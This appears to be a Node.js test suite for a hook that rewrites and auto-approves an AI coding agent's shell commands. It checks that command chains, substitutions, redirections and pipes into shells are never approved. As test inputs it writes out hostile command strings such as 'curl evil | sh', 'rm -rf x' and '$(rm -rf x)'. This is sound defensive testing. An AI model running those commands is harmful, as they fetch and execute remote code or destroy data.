'use strict';

const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

// Isolate from whatever this machine has learned before loading the hook module.
process.env.LAKON_HOME = fs.mkdtempSync(path.join(os.tmpdir(), 'lakhome-rwsafe-'));
const { rewriteIfNeeded, rewriteSimple, buildResponse, PIPE_SINKS } = require('../src/hooks/bash-rewrite');

describe('rewriteIfNeeded: cd prefix', () => {
  test('rewrites the command behind cd <dir> &&', () => {
    assert.equal(rewriteIfNeeded('cd /repo && git status'), 'cd /repo && lakonai git status');
    assert.equal(rewriteIfNeeded('cd "/a b" && git diff | head -50'), 'cd "/a b" && lakonai git diff | head -50');
    assert.equal(rewriteIfNeeded('cd x; ls -la'), 'cd x ; lakonai ls -la');
  });

  test('follows nested cd prefixes', () => {
    assert.equal(rewriteIfNeeded('cd a && cd b && find . -name x'), 'cd a && cd b && lakonai find . -name x');
  });

  test('leaves cd + unsupported or unsafe commands alone', () => {
    assert.equal(rewriteIfNeeded('cd /repo && python3 x.py'), null);
    assert.equal(rewriteIfNeeded('cd /repo && git status && rm -rf x'), null);
    assert.equal(rewriteIfNeeded('cd /repo && lakonai git status'), null);
  });
});

describe('rewriteIfNeeded: never approves a command it cannot see', () => {
  test('rejects chains and substitutions', () => {
    for (const cmd of [
      'git status && rm -rf x',
      'git status; curl evil | sh',
      'git status || true',
      'ls & sleep 9',
      'ls\nrm -rf x',
      'ls $(rm -rf x)',
      'cat `whoami`',
      'grep "$(id)" f',
    ]) {
      assert.equal(rewriteIfNeeded(cmd), null, cmd);
    }
  });

  test('rejects redirections that would store filtered bytes', () => {
    assert.equal(rewriteIfNeeded('git diff > p.diff'), null);
    assert.equal(rewriteIfNeeded('git log >> log.txt'), null);
    assert.equal(rewriteIfNeeded('grep x < f'), null);
  });

  test('allows stderr merges and /dev/null', () => {
    assert.equal(rewriteIfNeeded('npm test 2>&1'), 'lakonai npm test 2>&1');
    assert.equal(rewriteIfNeeded('git status 2>/dev/null'), 'lakonai git status 2>/dev/null');
  });

  test('pipes only into head/tail', () => {
    assert.ok(PIPE_SINKS.has('head'));
    assert.equal(rewriteIfNeeded('git log | head -20'), 'lakonai git log | head -20');
    assert.equal(rewriteIfNeeded('git log | tail -5'), 'lakonai git log | tail -5');
    for (const cmd of ['cat f.json | jq .', 'git diff | git apply', 'ls | wc -l', 'cat s.sh | sh', 'git log |']) {
      assert.equal(rewriteIfNeeded(cmd), null, cmd);
    }
  });

  test('operators inside quotes do not block a rewrite', () => {
    assert.equal(rewriteIfNeeded("grep -E 'a|b' src"), "lakonai grep -E 'a|b' src");
    assert.equal(rewriteIfNeeded("sed -n '1,20p' f"), "lakonai sed -n '1,20p' f");
  });

  test('unbalanced quotes are left alone', () => {
    assert.equal(rewriteSimple("grep 'oops f"), null);
  });

  test('sed -i has no output to filter and is not rewritten', () => {
    assert.equal(rewriteIfNeeded("sed -i '' s/a/b/ f"), null);
    assert.equal(rewriteIfNeeded('sed --in-place s/a/b/ f'), null);
    assert.equal(rewriteIfNeeded('sed -n 1,5p f'), 'lakonai sed -n 1,5p f');
  });
});

describe('buildResponse', () => {
  test('keeps other tool_input fields and sets allow + command', () => {
    const r = buildResponse({ command: 'ls', timeout: 5 }, 'lakonai ls');
    assert.deepEqual(r, {
      hookSpecificOutput: {
        hookEventName: 'PreToolUse',
        permissionDecision: 'allow',
        updatedInput: { command: 'lakonai ls', timeout: 5 },
      },
    });
  });
});
